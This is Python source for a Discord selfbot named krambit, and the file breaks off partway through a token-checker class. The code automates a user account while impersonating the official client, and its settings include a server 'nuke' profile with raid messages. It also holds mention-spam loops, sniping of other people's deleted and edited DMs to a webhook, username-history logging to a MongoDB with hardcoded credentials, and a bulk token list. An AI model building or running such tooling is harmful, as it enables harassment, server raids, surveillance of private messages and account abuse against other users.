import discord
from discord.ext import commands, tasks
import asyncio
import random
import requests
import aiohttp
import websocket
import time
import hashlib
from discord.gateway import DiscordWebSocket
from datetime import datetime, timezone, timedelta
import tls_client
import base64
import math
from urllib.parse import urlencode
from urllib.request import urlretrieve
import urllib.request
from PIL import Image, ImageDraw, ImageFont, ImageFilter, ImageOps, ImageColor, ImageChops
import textwrap
import io
from pystyle import Center, Colors, Colorate
import itertools
import re
from itertools import cycle
import logging
import httpx
import threading
import collections
import motor.motor_asyncio
import string
import uuid
from curl_cffi.requests import AsyncSession
from io import BytesIO
from aiohttp.resolver import AsyncResolver
import subprocess
import shutil
from requestcord import ProfileEditor, HeaderGenerator
import os
import sys
from pathlib import Path
import json
from typing import List, Optional, Tuple
from tls_client import Session


def ensure_discord_py_available():
    base = Path.cwd() / "discord.py"
    sitepkgs = base / "site-packages"

    if sitepkgs.exists():
        sys.path.insert(0, str(sitepkgs))
        return

    base.mkdir(parents=True, exist_ok=True)
    sitepkgs.mkdir(parents=True, exist_ok=True)

    subprocess.check_call([
        sys.executable,
        "-m",
        "pip",
        "install",
        "--upgrade",
        "--target",
        str(sitepkgs),
        "discord-ext-voice-recv"
    ])

    sys.path.insert(0, str(sitepkgs))

ensure_discord_py_available()



def ensure_module(module: str, version: str):
    out = os.popen(f"pip show {module}").read()
    if f"Version: {version}" not in out:
        os.system(f"pip install {module}=={version}")

ensure_module("protobuf", "4.23.4")
ensure_module("requestcord", "1.0.1")

os.makedirs("krambit/dmsnipe", exist_ok=True)
os.makedirs("krambit/meme", exist_ok=True)
os.makedirs("krambit/scrape", exist_ok=True)
os.makedirs("krambit/nuke", exist_ok=True)


if not os.path.exists("krambit/scrape/members.txt"):
    open("krambit/scrape/members.txt", "w").close()

if not os.path.exists("krambit/nuke/an.txt"):
    open("krambit/nuke/an.txt", "w").close()


if not os.path.exists("ab.txt"):
    open("ab.txt", "w").close()    
    
with open("settings.json", "r", encoding="utf-8") as f:
    krambitcfg = json.load(f)


import json, os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FILE_PATH = os.path.join(BASE_DIR, "settings.json")
try:
    with open(FILE_PATH, "r", encoding="utf-8") as f:
        krambitcfg = json.load(f)
except FileNotFoundError:
    raise RuntimeError(f"File not found: {FILE_PATH}")
except json.JSONDecodeError as e:
    raise RuntimeError(f"Invalid JSON in {FILE_PATH}: {e}")


token = krambitcfg.get("token")
if not token:
    raise RuntimeError(f"'token' missing sa {FILE_PATH}! Keys found: {list(krambitcfg.keys())}")

antok = krambitcfg.get("antok", ".")
krambitbot = krambitcfg.get("krambitbot", ".")
floodbot = krambitcfg.get("floodbot", ".")
nukecfg = krambitcfg.get("nuke", {})
appcfg = krambitcfg.get("appbot", {})
pre = "."
file = FILE_PATH

print("Welcome user.")

async def gp(bot, message) -> str:
    return pre


globalhead = {
    "authority": "discord.com",
    "scheme": "https",
    "accept": "*/*",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US",
    "authorization": token,
    "origin": "https://discord.com/",
    "sec-ch-ua": "\"Not/A)Brand\";v=\"99\", \"Brave\";v=\"181\", \"Chromium\";v=\"142\"",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9209 Chrome/142.0.0.0 Electron/38.0.0 Safari/537.36",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "X-Debug-Options": "bugReporterEnabled",
    "X-Discord-Locale": "en-US",
    "X-Discord-Timezone": "Asia/Calcutta",
    "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MjA5Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgZGlzY29yZC8xLjAuOTIwOSBDaHJvbWUvMTQyLjAuMC4wIEVsZWN0cm9uLzM4LjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMzguMC4wIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjQwMjM3LCJuYXRpdmVfYnVpbGRfbnVtYmVyIjozODUxNywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ=="
}



def fetch_discord_cookies(token):
    s = Session(client_identifier="chrome_142", random_tls_extension_order=True)
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
    h = {"user-agent": ua, "accept-language": "en-US,en;q=0.9", "authorization": token}
    s.get("https://discord.com", headers={**h, "accept": "text/html,application/xhtml+xml"})
    s.get("https://discord.com/app", headers={**h, "accept": "text/html,application/xhtml+xml", "referer": "https://discord.com/"})
    s.get("https://discord.com/api/v9/experiments", headers={**h, "accept": "*/*", "origin": "https://discord.com", "referer": "https://discord.com/app"})
    s.post("https://discord.com/api/v9/science", headers={**h, "accept": "*/*", "content-type": "application/json", "origin": "https://discord.com", "referer": "https://discord.com/app"}, json={"events": []})
    s.get("https://discord.com/api/v9/users/@me", headers={**h, "accept": "*/*", "origin": "https://discord.com", "referer": "https://discord.com/channels/@me"})
    time.sleep(0.3)
    return dict(s.cookies)

def cookies_to_header(cookies):
    return "; ".join(f"{k}={v}" for k, v in cookies.items())


def fetch_discord_fingerprint(globalhead):
    s = Session(client_identifier="chrome_142", random_tls_extension_order=True)
    r = s.get("https://discord.com/api/v9/experiments", headers=globalhead)
    try:
        return r.json().get("fingerprint")
    except:
        return None


def load_settings(file):
    if not os.path.exists(file):
        data = {
            "token": ".",
            "antok": ".",
            "krambitbot": ".",
            "floodbot": ".",
            "appbot": {
                "appid": "1443535817871069296",
                "floodfield": "krambit > you",
                "floodmark": "krambit > everyone",
                "mainicon": "https://i.pinimg.com/originals/d9/3c/00/d93c00dc92a0e5fd0b064b596dc2f27a.gif",
                "floodicon": "https://cdn.discordapp.com/attachments/1393823502234292306/1397106114927267943/zCbKHMGY.gif"
            },
            "antigc": {
                "enabled": True,
                "webhook": "",
                "gcmsg": "u cant trap krambit son",
                "whitelist": [544612107937906741]
            },
            "dmsniper": {
                "enabled": True,
                "webhook": "",
                "whitelist": [544612107937906741]
            },
            "nuke": {
                "ban_reason": "Fucked by krambit",
                "webhook_av": "",
                "webhook_name": "krambit > you",
                "protected_ids": [
                    "1384194050193883319",
                    "1252950519710879848",
                    "544612107937906741"
                ],
                "channel_names": [
                    "beamed by krambit",
                    "krambit was here"
                ],
                "messages": [
                    "@everyone FLOW > YOU \n\nhttps://discord.gg/nBhCxs6ACw",
                    "@everyone krambit beamed this"
                ]
            }
        }
        with open(file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        return data

    with open(file, "r", encoding="utf-8") as f:
        return json.load(f)
        
        
def save_settings(data):
    with open(file, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)

cfg = load_settings(file)
    


krambit = commands.Bot(command_prefix=gp, case_insensitive=True, self_bot=False, help_command=None, strip_after_prefix=True, chunk_guilds_at_startup=False, assume_unsync_clock=True, max_messages=5000, heartbeat_timeout=120.0, reconnect=True)
mongo_client = motor.motor_asyncio.AsyncIOMotorClient("mongodb+srv://krambitccccx:krambitruns@krambit-log.0ua8led.mongodb.net/?retryWrites=true&w=majority&appName=krambit-log")
krambit.db = mongo_client["avatar_logger"]
anguild = 1450472183015931928

BADGE_MAP = {6:"leaf",0:"sword",7:"heart",8:"flame",1:"water_drop",2:"skull",4:"moon",5:"lightning",9:"diamond",3:"mushroom"}
PRESET_BADGE_IDS = list(BADGE_MAP.keys())
PRESET_COLORS = ["#ffffff","#ffffff","#000000","#ff7fc0","#000000","#ff0000","#ff4444","#00ff00","#44ff44","#0000ff","#4444ff","#ffff00","#ffff44","#ff00ff","#ff44ff","#00ffff","#44ffff","#ffffff","#cccccc","#444444","#ff1c90","#800080","#8a2be2","#9370db","#dda0dd","#ee82ee","#c71585","#008080","#20b2aa","#40e0d0","#7fffd4","#2f4f4f","#708090","#778899","#b0c4de","#696969","#ff69b4","#ff1493","#ffc0cb","#f5deb3","#ffe4b5","#faf0e6","#1e90ff","#4169e1","#00008b"]
EXTRA_PRESET_COLORS = ["#800080","#8a2be2","#9370db","#dda0dd","#ee82ee","#c71585","#008080","#20b2aa","#40e0d0","#7fffd4","#2f4f4f","#708090","#778899","#b0c4de","#696969","#ff69b4","#ff1493","#ffc0cb","#f5deb3","#ffe4b5","#faf0e6","#1e90ff","#4169e1","#00008b"]
PRESET_COLORS += EXTRA_PRESET_COLORS
PRESET_NAMES = ["#1W","ï·½ï·½ï·½ï·½","#1","GODW","GODS"]

class GuildRotator:
    def __init__(self, tag="krambit", fixed_badge=None, rotate_names=False):
        self.active = False
        self.delay = 181
        self.name_delay = 190
        self.current_badge = 1
        self.badge_cycle = cycle(PRESET_BADGE_IDS)
        self.color_cycle = cycle(PRESET_COLORS)
        self.fixed_color = None
        self.tag = tag
        self.fixed_badge = fixed_badge
        self.name_cycle = cycle(PRESET_NAMES)
        self.rotate_names = rotate_names
        self.initial_badge = fixed_badge if fixed_badge is not None else 1
        self.initial_color = next(self.color_cycle)


def now_ms():
    return int(time.time() * 1000)


sesh = Session(client_identifier="chrome_142", random_tls_extension_order=True)
session = None


async def identify(self):
    payload = {
        "op": self.IDENTIFY,
        "d": {
            "token": self.token,
            "capabilities": 4093,
            "properties": {
                "os": "Windows",
                "browser": "Discord Client",
                "device": "Desktop",
                "system_locale": "en-US",
                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Electron/38.0.0 Safari/537.36",
                "browser_version": "142.0.0.0",
                "os_version": "10",
                "referrer": "",
                "referring_domain": ""
            },
            "compress": False,
            "client_state": {
                "guild_versions": {},
                "highest_last_message_id": "0",
                "read_state_version": 0,
                "user_guild_settings_version": -1,
                "user_settings_version": -1,
                "private_channels_version": "0",
                "api_code_version": 0
            }
        }
    }
    await self.send_as_json(payload)

DiscordWebSocket.identify = identify


def mainHeader():
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9209 Chrome/142.0.0.0 Electron/38.0.0 Safari/537.36"

    return {
        'authority': 'discord.com',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US',
        'Content-Type': 'application/json',
        'authorization': token,
        'referer': 'https://discord.com/channels/@me',
        'origin': 'https://discord.com',
        'user-agent': user_agent,
        'dnt': '1',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="142", "Google Chrome";v="142"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-discord-timezone': 'America/Chicago',
        'x-super-properties': 'eyJvcyI6ICJXaW5kb3dzIiwgImJyb3dzZXIiOiAiRGlzY29yZCBDbGllbnQiLCAicmVsZWFzZV9jaGFubmVsIjogInN0YWJsZSIsICJjbGllbnRfdmVyc2lvbiI6ICIxLjAuOTIwOSIsICJvc192ZXJzaW9uIjogIjEwLjAuMjI2MjEiLCAib3NfYXJjaCI6ICJ4NjQiLCAic3lzdGVtX2xvY2FsZSI6ICJlbi1VUyIsICJkZXZpY2UiOiAiIiwgImJyb3dzZXJfdXNlcl9hZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBkaXNjb3JkLzEuMC45MjA5IENocm9tZS8xNDIuMC4wLjAgRWxlY3Ryb24vMzguMC4wIFNhZmFyaS81MzcuMzYiLCAiYnJvd3Nlcl92ZXJzaW9uIjogIjM4LjAuMCIsICJjbGllbnRfYnVpbGRfbnVtYmVyIjogNDc2OTcsICJuYXRpdmVfYnVpbGRfbnVtYmVyIjogMjkzOTU5LCAiY2xpZW50X2V2ZW50X3NvdXJjZSI6IG51bGx9',
        'x-discord-client-version': '1.0.9209',
        'x-discord-app-version': '1.0.9209',
        'x-update-token': '',
        'x-failed-requests': '0'
    }
    

ar2file = 'ar2.txt'
if not os.path.exists(ar2file):
    with open(ar2file, 'w') as f:
        pass
              
def newlines(text):
    return text.replace('\n', '\\n')

def newline(text):
    return text.replace('\\n', '\n')

def loadar2():
    ar2users = {}
    with open(ar2file, 'r') as f:
        for line in f:
            if line.strip():
                user_id, username, message = line.strip().split(" | ", 2)
                ar2users[int(user_id)] = (username, newline(message))
    return ar2users

def savear2(ar2users):
    with open(ar2file, 'w') as f:
        for user_id, (username, message) in ar2users.items():
            f.write(f"{user_id} | {username} | {newlines(message)}\n")           

arfile = 'ar.txt'
if not os.path.exists(arfile):
    with open(arfile, 'w') as f:
        pass

def loadar():
    global ar_users, ar_active
    ar_users.clear()
    
    with open(arfile, 'r') as f:
        for line in f:
            if line.strip():
                user_id = int(line.strip())
                ar_users.add(user_id)

    ar_active = bool(ar_users)

def savear():
    with open(arfile, 'w') as f:
        for user_id in ar_users:
            f.write(f"{user_id}\n")
            
with open('ab.txt', 'r') as file:
    send = [line.strip() for line in file]    

with open('ab.txt', 'r') as file:
    press = [line.strip() for line in file]
 
with open('ab.txt', 'r') as file:
    press2 = [line.strip() for line in file]
 
def toks(file_path='tokens.txt'):
    with open(file_path, 'r') as file:
        tokens = file.readlines()
    return [token.strip() for token in tokens if token.strip()]
  


emojisreact: List[str] = []
reaction_active: bool = False
emojip: Optional[str] = None
rate_limit_lock: asyncio.Lock = asyncio.Lock()
autoreply_enabled = False
tasks = {}
reply_active = True
ar_active = False
ar_users = set()
gc1status = {}
ap = False
auto_replies = {}
ar2users = loadar2()
auto_reply_enabled = {user_id: True for user_id in ar2users}
auto_replies.update({user_id: message for user_id, (_, message) in ar2users.items()})
ap2 = False
stfu_users = {}
spamregion_task = None
start_time = datetime.now(timezone.utc)
statuses = []
statusi = 0
stream_images = []
imagei = 0
stream_large_image = None
statusr = False
last_image_switch = 0
ab = False
rgid = []
rga = False
rspam = False
auto_adder_enabled = False
gc_id = None
user_ids = []
tags = {}
pspam = False
voice_client = None
superreact_pattern: re.Pattern[str] = re.compile(r'<a?:([a-zA-Z0-9_]+):(\d+)>')
superreact_api: str = (
    "https://discord.com/api/v10/channels/{channel_id}/"
    "messages/{message_id}/reactions/{emoji}/@me"
    "?location=Message%20Reaction%20Picker&type=1"
)
super_emojis: List[str] = []
super_reaction_active: bool = False
super_emojip: Optional[str] = None
super_rate_limit_lock: asyncio.Lock = asyncio.Lock()
super_session: AsyncSession = AsyncSession()
super_headers = HeaderGenerator().generate_headers(token=token)
guildheaders = HeaderGenerator().generate_headers(token=token)
guild_tasks = {}
guild_tags = {}
guild_badges = {}


sessionid = None

@krambit.listen()
async def on_ready() -> None:
    global pre, session, sessionid
    os.system('cls' if os.name == 'nt' else 'clear')
    
    user_name = str(krambit.user.name)[:25]
    prefix_text = str(pre)
    version = "Dev"
    server_count = len(krambit.guilds)


    box_width = 35
    border_line = "═" * (box_width + 2)

    info_box = f"""                                                                          
╔═════════════════════════════════════╗
║           krambit SELFBOT           ║
║          By krambit                 ║ 
╚═════════════════════════════════════╝
╔{border_line}╗
║ Welcome  : {user_name:<25}║
║ Prefix   : {prefix_text:<25}║
║ Version  : {version:<25}║
║ Servers  : {server_count:<25}║
╚{border_line}╝
    """

    chosen_color = random.choice([Colors.red_to_yellow, Colors.blue_to_cyan, Colors.green_to_blue])
    colored_info_box = Colorate.Horizontal(chosen_color, info_box, 1)

    os.system('cls' if os.name == 'nt' else 'clear')
    print(colored_info_box)

    cookie_header = cookies_to_header(fetch_discord_cookies(token))
    globalhead["cookie"] = cookie_header

    fingerprint = fetch_discord_fingerprint(globalhead)
    if fingerprint:
        globalhead["X-Fingerprint"] = fingerprint        

    if session is None:
        session = aiohttp.ClientSession(headers=mainHeader())

    if sessionid is None:
        sessionid = getattr(krambit.ws, "session_id", None)


@krambit.event
async def on_message(message):
    await krambit.process_commands(message)

    global auto_reply_enabled, reaction_active, ar_users, super_reaction_active

    if message.author == krambit.user and super_reaction_active and super_emojis:
        emoji = super_emojir()
        if emoji:
            await super_react_task(message, emoji)

    if reaction_active and message.author.id == krambit.user.id:
        chosen_emoji = emojir()
        if chosen_emoji:
            await react_task(message, chosen_emoji)

    if message.author == krambit.user:
        return

    if ar_active and message.author.id in ar_users:
        reply = random.choice(send)
        await replytask(message, reply)

    if message.author.id in stfu_users:
        await message.delete()
        return

    if message.author.id in auto_replies and auto_reply_enabled.get(message.author.id, False):
        fr = auto_replies[message.author.id]
        try:
            await message.reply(f"{fr}")
            await asyncio.sleep(1.3)
        except discord.HTTPException:
            pass

async def react_task(message, emoji):  
    try:  
        if message.type in (discord.MessageType.default, discord.MessageType.reply):
            async with rate_limit_lock:  
                await message.add_reaction(emoji)  
    except discord.HTTPException as e:  
        print(f"Error reacting to message: {e}")

def emojir():
    global emojip, emojisreact
    if not emojisreact:
        return None
    random.shuffle(emojisreact)
    for emoji in emojisreact:
        if emoji != emojip:
            emojip = emoji
            return emoji
    return random.choice(emojisreact)


async def replytask(message, reply):
    try:
        if message.type in (discord.MessageType.default, discord.MessageType.reply):
            async with rate_limit_lock:
                await message.reply(reply)
    except discord.HTTPException as e:
        print(f'Failed to reply: {e}')
    except Exception as e:
        print(f'Failed to reply: {e}')


def encode_super_emoji(emoji: str) -> str:
    custom_match = superreact_pattern.match(emoji)
    if custom_match:
        animated = "a" if emoji.startswith("<a") else ""
        return f"{animated}:{custom_match.group(1)}:{custom_match.group(2)}"
    return "".join(f"%{b:02X}" for b in emoji.encode("utf-8"))


def super_emojir():
    global super_emojip, super_emojis
    if not super_emojis:
        return None
    random.shuffle(super_emojis)
    for emoji in super_emojis:
        if emoji != super_emojip:
            super_emojip = emoji
            return emoji
    return random.choice(super_emojis)


async def super_react_task(message, emoji):
    try:
        if message.type in (discord.MessageType.default, discord.MessageType.reply):
            async with super_rate_limit_lock:
                encoded_emoji = encode_super_emoji(emoji)
                url = superreact_api.format(
                    channel_id=message.channel.id,
                    message_id=message.id,
                    emoji=encoded_emoji
                )
                response = await super_session.put(
                    url,
                    headers=super_headers,
                    impersonate="chrome120"
                )
                if response.status_code not in (200, 204):
                    print(f"Reaction failed {response.status_code}: {response.text}")
    except Exception as e:
        print(f"Error reacting: {e}")
        
@krambit.event
async def on_user_update(before, after):

    if after.id == krambit.user.id:
        return

    await asyncio.sleep(0.5)

    if before.name != after.name:
        existing_user = await krambit.db.db.users.find_one({
            "_id": after.id,
            "username_history.value": before.name
        })

        if not existing_user:
            await krambit.db.db.users.update_one(
                {"_id": after.id},
                {"$push": {
                    "username_history": {
                        "value": before.name,
                        "timestamp": str(datetime.now(timezone.utc))
                    }
                }},
                upsert=True
            )


async def unfriend(user_id):
    async with aiohttp.ClientSession() as session:
        url = f"https://discord.com/api/v10/users/@me/relationships/{user_id}"
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
        }

        async with session.delete(url, headers=headers) as response:
            if response.status == 204:
                print(f"Unfriended user {user_id}")
            else:
                print(f"Failed to unfriend {user_id}: {response.status} - {await response.text()}")               
    
            
async def silent_leave(channel_id, token):
    async with aiohttp.ClientSession() as session:
        url = f"https://discord.com/api/v10/channels/{channel_id}?silent=true"
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
        }
        async with session.delete(url, headers=headers):
            pass
            
@krambit.event
async def on_private_channel_create(channel):
    if not isinstance(channel, discord.GroupChannel):
        return

    cfg = load_settings(file)
    config_agc = cfg.get("antigc", {})

    if not config_agc.get("enabled", False):
        return

    gcmsg = config_agc.get("gcmsg")
    gclog = config_agc.get("webhook")
    gcwls = config_agc.get("whitelist")

    async def rename_and_leave():
        if channel.name != gcmsg:
            await channel.edit(name=gcmsg)
        await silent_leave(channel.id, token)

    async def send_log(title: str, fields: dict):
        if not gclog:
            return
        member_list = "\n".join(
            [f"[{i+1}] {m.name}" for i, m in enumerate(channel.recipients)]
        )
        embed = discord.Embed(title=title, color=discord.Color.blue())
        for name, value in fields.items():
            embed.add_field(name=name, value=value, inline=False)
        embed.add_field(name="GC Members", value=member_list or "None", inline=False)

        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(gclog, session=session)
            await webhook.send(embed=embed)

    await asyncio.sleep(0.3)

    owner = None
    for attempt in range(10):
        try:
            owner = channel.owner
            if owner is not None:
                break
        except Exception:
            pass
        await asyncio.sleep(0.3)

    if not owner:
        await rename_and_leave()
        return

    if owner.id == krambit.user.id or owner.id in gcwls:
        return

    adder = None

    try:
        async for message in channel.history(limit=10):
            if (
                message.system_content
                and "added" in message.system_content.lower()
                and krambit.user in message.mentions
            ):
                adder = message.author
                break

        if not adder:
            await send_log("Group Chat Left (No Adder Detected)", {
                "GC Owner": owner.name,
            })
            await rename_and_leave()
            return

        if adder.id != krambit.user.id and adder.id not in gcwls:
            await unfriend(adder.id)
            await send_log("Group Chat Left", {
                "Adder": adder.name,
                "GC Owner": owner.name,
            })
            await rename_and_leave()

    except Exception:
        await rename_and_leave()

async def dimg(url, filename):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status == 200:
                os.makedirs("krambit", exist_ok=True)
                filepath = f"krambit/dmsnipe/{filename}"
                with open(filepath, "wb") as f:
                    f.write(await resp.read())
                return filepath
    return None


async def sendweb(embed=None, files=None):
    cfg = load_settings(file)
    webhook_url = cfg["dmsniper"]["webhook"]

    if not webhook_url:
        return

    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(webhook_url, session=session)
        await webhook.send(embeds=[embed] if embed else None, files=files or [])

@krambit.event
async def on_message_delete(message: discord.Message) -> None:
    await asyncio.sleep(2)

    cfg = load_settings(file)
    config = cfg["dmsniper"]

    if (
        not config["enabled"]
        or not isinstance(message.channel, (discord.DMChannel, discord.GroupChannel))
        or message.author.id in config["whitelist"]
        or message.channel.id in config["whitelist"]
    ):
        return

    embed = discord.Embed(
        title="Deleted Message",
        description=(
            f"**Author:** {message.author.name} ({message.author.id})\n"
            f"**Channel:** <#{message.channel.id}>\n"
            f"**Content:** {message.content or '[Empty]'}"
        ),
        color=discord.Color.red(),
    )

    files = []

    for attachment in message.attachments:
        filepath = await dimg(attachment.url, attachment.filename)
        if filepath:
            files.append(discord.File(filepath))

    for e in message.embeds:
        if e.type == "image" and e.url:
            filename = e.url.split("/")[-1]
            filepath = await dimg(e.url, filename)
            if filepath:
                files.append(discord.File(filepath))

    await sendweb(embed=embed, files=files)

    for f in files:
        try:
            os.remove(f.fp.name)
        except OSError:
            pass


@krambit.event
async def on_message_edit(before: discord.Message, after: discord.Message) -> None:
    await asyncio.sleep(0.3)

    cfg = load_settings(file)
    config = cfg["dmsniper"]

    if (
        not config["enabled"]
        or not isinstance(before.channel, (discord.DMChannel, discord.GroupChannel))
        or before.author.id in config["whitelist"]
        or before.channel.id in config["whitelist"]
        or before.content == after.content
    ):
        return

    embed = discord.Embed(
        title="Edited Message",
        description=(
            f"**Author:** {before.author.name} ({before.author.id})\n"
            f"**Channel:** <#{before.channel.id}>\n"
            f"**Before:** {before.content or '[Empty]'}\n"
            f"**After:** {after.content or '[Empty]'}"
        ),
        color=discord.Color.blue(),
    )

    await sendweb(embed=embed)
      



async def aptask(channel, apuser, press, delay):

    while ap:
        reply = random.choice(press)
        mentions = " ".join(f"<@{user.id}>" for user in apuser)
        message = f'# {reply} {mentions} '
        
        try:
            await channel.send(message)
        except discord.Forbidden:
            continue
        except Exception as e:
            print(f"An error occurred: {e}")
            await asyncio.sleep(5)
        
        await asyncio.sleep(delay)


async def ap2task(ctx, message):
    global ap2
    counter = 1
    channel = ctx.channel

    while ap2:
        try:
            await channel.send(f"{message}")
        except discord.Forbidden:
            continue
        except Exception as e:
            print(f"An error occurred: {e}")
            await asyncio.sleep(5)

        await asyncio.sleep(3)


async def ustream():
    global statusi, imagei, stream_large_image, last_image_switch

    if not statuses or not krambit.ws:
        await asyncio.sleep(1)
        return

    now = time.time()

    if stream_images and (now - last_image_switch >= 60):
        imagei = (imagei + 1) % len(stream_images)
        stream_large_image = stream_images[imagei]
        last_image_switch = now

    payload = {
        "op": 3,
        "d": {
            "since": int(time.time() * 1000),
            "activities": [{
                "type": 1,
                "name": statuses[statusi],
                "url": "https://www.twitch.tv/ex",
                "assets": {
                    "large_image": stream_large_image,
                    "large_text": statuses[statusi]
                }
            }],
            "status": "dnd",
            "afk": False
        }
    }

    await krambit.ws.send(json.dumps(payload))

    statusi = (statusi + 1) % len(statuses)
    await asyncio.sleep(10)


def gab():
    try:
        with open("ab.txt", "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
        return random.choice(lines) if lines else "Default beef message"
    except FileNotFoundError:
        return "Beef file not found."



async def msgab(msg, type_, channel, mentions):
    try:
 
        if type_ == 'normal':
            content = f"# {msg} {mentions}"
        elif type_ == 'half':
            words = msg.split()
            midpoint = len(words) // 2 or 1
            content = f"# {' '.join(words[:midpoint])}\n# {' '.join(words[midpoint:])} {mentions}"
        elif type_ == 'split':
            content = '\n'.join(f"# {word}" for word in msg.split()) + f"\n# {mentions}"
        elif type_ == 'mixed':
            mixed_type = random.choice(['normal', 'half', 'split'])
            return await msgab(msg, mixed_type, channel, mentions)
        else:
            content = f"# {msg} {mentions}"

        await channel.send(content)

    except Exception as e:
        print(f"[AB ERROR] Failed to send message: {e}")
        await asyncio.sleep(2)


async def fetch_guild_profile(guild_id):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                f'https://discord.com/api/v9/guilds/{guild_id}/profile',
                headers=guildheaders
            ) as resp:
                if resp.status == 200:
                    return await resp.json()
                logging.warning(f"Failed to fetch guild profile: {resp.status}")
                return None
    except Exception as e:
        logging.error(f"Fetch error: {str(e)}")
        return None

async def update_guild_profile(guild_id, badge_num, color, tag):
    payload = {
        "badge": badge_num,
        "badge_color_primary": color,
        "badge_color_secondary": color,
        "tag": tag
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.patch(
                f'https://discord.com/api/v9/guilds/{guild_id}/profile',
                json=payload,
                headers=guildheaders
            ) as resp:
                if resp.status == 429:
                    retry_after = float(resp.guildheaders.get('Retry-After', 20))
                    logging.warning(f"Rate limited - Retrying after {retry_after}s")
                    await asyncio.sleep(retry_after)
                    return await update_guild_profile(guild_id, badge_num, color, tag)
                
                if resp.status not in [200, 201, 204]:
                    logging.error(f"Update failed: {resp.status} - {await resp.text()}")
                    return False
                return True
    except Exception as e:
        logging.error(f"Update error: {str(e)}")
        return False

async def rotation_task(ctx, rotation_type):
    guild_id = ctx.guild.id
    rotator = guild_tasks[guild_id][rotation_type]['rotator']
    
    while rotator.active:
        try:
            if rotator.rotate_names:
                badge_num = rotator.fixed_badge if rotator.fixed_badge is not None else rotator.initial_badge
                color = rotator.fixed_color if rotator.fixed_color is not None else rotator.initial_color
                tag = guild_tags.get(guild_id, next(rotator.name_cycle))
                logging.info(f"Rotating to tag 'PRESET_NAMES'")
                success = await update_guild_profile(guild_id, badge_num, color, tag)
                
                if success:
                    logging.info(f"Updated to tag 'PRESET_NAMES'")
                else:
                    logging.error("Stopping name rotation due to failures")
                    break
                    
                await asyncio.sleep(rotator.name_delay)
            else:
                badge_num = rotator.fixed_badge if rotator.fixed_badge is not None else next(rotator.badge_cycle)
                color = rotator.fixed_color or next(rotator.color_cycle)
                tag = guild_tags.get(guild_id, rotator.tag)
                
                logging.info(f"Rotating to {BADGE_MAP[badge_num]} ({badge_num}) with {color} and tag '{tag}'")
                success = await update_guild_profile(guild_id, badge_num, color, tag)
                
                if success:
                    logging.info(f"Updated to {BADGE_MAP[badge_num]} (ID: {badge_num}) with {color} and tag '{tag}'")
                    rotator.current_badge = badge_num
                else:
                    logging.error("Stopping badge rotation due to failures")
                    break
                    
                await asyncio.sleep(rotator.delay)
            
        except Exception as e:
            logging.error(f"{rotation_type.capitalize()} rotation error: {str(e)}")
            await asyncio.sleep(180)

def extract_user_id(text):
    try:
        return int(text.replace("<@", "").replace("!", "").replace(">", ""))
    except:
        return None


async def download_image(url):
    resolver = AsyncResolver()
    connector = aiohttp.TCPConnector(resolver=resolver)

    async with aiohttp.ClientSession(connector=connector) as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                raise ValueError(f"Failed to download image: HTTP {resp.status}")
            return io.BytesIO(await resp.read())


def split_message(message, limit=1999):
    return [message[i:i+limit] for i in range(0, len(message), limit)]


class TokenChecker:
    URLS = {
        "nitro": "https://discord.com/api/v9/users/@me/billing/subscriptions",
        "trial": "https://discord.com/api/v9/users/@me/billing/user-offer",
    }

    HEADERS_TEMPLATE = {
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'authorization': '',
        'content-type': 'application/json',
        'origin': 'https://discord.com',
